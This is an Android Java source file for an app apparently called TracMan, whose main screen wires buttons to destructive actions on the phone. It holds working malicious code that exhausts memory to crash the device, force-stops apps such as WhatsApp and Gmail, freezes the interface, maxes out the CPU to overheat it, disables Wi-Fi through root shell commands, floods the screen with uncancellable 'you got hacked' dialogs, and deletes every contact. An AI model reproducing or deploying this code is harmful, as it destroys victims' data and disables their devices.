package com.tracman.bug;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        findViewById(R.id.btnCrash).setOnClickListener(v -> crashSystem());
        findViewById(R.id.btnFC1).setOnClickListener(v -> forceClose("com.android.chrome"));
        findViewById(R.id.btnFC2).setOnClickListener(v -> forceClose("com.whatsapp"));
        findViewById(R.id.btnFC3).setOnClickListener(v -> forceClose("com.instagram.android"));
        findViewById(R.id.btnFC4).setOnClickListener(v -> forceClose("com.facebook.katana"));
        findViewById(R.id.btnFC5).setOnClickListener(v -> forceClose("com.google.android.gm"));
        findViewById(R.id.btnFreeze).setOnClickListener(v -> freezeUI());
        findViewById(R.id.btnOverheat).setOnClickListener(v -> overheatCPU());
        findViewById(R.id.btnDisableWifi).setOnClickListener(v -> disableWifi());
        findViewById(R.id.btnSpamNotify).setOnClickListener(v -> spamNotifications());
        findViewById(R.id.btnDeleteContacts).setOnClickListener(v -> deleteContacts());
    }
    private void crashSystem() {
        new Thread(() -> {
            ArrayList<byte[]> list = new ArrayList<>();
            while (true) {
                for (int i = 0; i < 1000; i++) list.add(new byte[1024 * 1024]);
                try { Thread.sleep(50); } catch (Exception e) {}
            }
        }).start();
        Toast.makeText(this, "crashing in progress", Toast.LENGTH_SHORT).show();
    }
    private void forceClose(String pkg) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                am.killBackgroundProcesses(pkg);
            } else {
                Process p = Runtime.getRuntime().exec("su -c am force-stop " + pkg);
                p.waitFor();
            }
            Toast.makeText(this, "force closed: " + pkg, Toast.LENGTH_SHORT).show();
        } catch (Exception e) { Toast.makeText(this, "fail: " + e.getMessage(), Toast.LENGTH_LONG).show(); }
    }
    private void freezeUI() {
        findViewById(R.id.mainLayout).post(() -> {
            while (true) { try { Thread.sleep(1000); } catch (Exception e) {} }
        });
    }
    private void overheatCPU() {
        new Thread(() -> {
            while (true) {
                double x = 0;
                for (int i = 0; i < Integer.MAX_VALUE; i++) x += Math.sqrt(i);
            }
        }).start();
    }
    private void disableWifi() {
        try {
            Process p = Runtime.getRuntime().exec("su -c svc wifi disable");
            p.waitFor();
            Toast.makeText(this, "wifi disabled", Toast.LENGTH_SHORT).show();
        } catch (Exception e) { Toast.makeText(this, "root required", Toast.LENGTH_SHORT).show(); }
    }
    private void spamNotifications() {
        new Handler().postDelayed(() -> {
            for (int i = 0; i < 50; i++) {
                new AlertDialog.Builder(this)
                    .setTitle("SPAM " + i)
                    .setMessage("you got hacked by TracMan")
                    .setCancelable(false)
                    .show();
            }
        }, 1000);
    }
    private void deleteContacts() {
        try {
            getContentResolver().delete(ContactsContract.Contacts.CONTENT_URI, null, null);
            Toast.makeText(this, "contacts deleted", Toast.LENGTH_SHORT).show();
        } catch (Exception e) { Toast.makeText(this, "perm denied", Toast.LENGTH_SHORT).show(); }
    }
}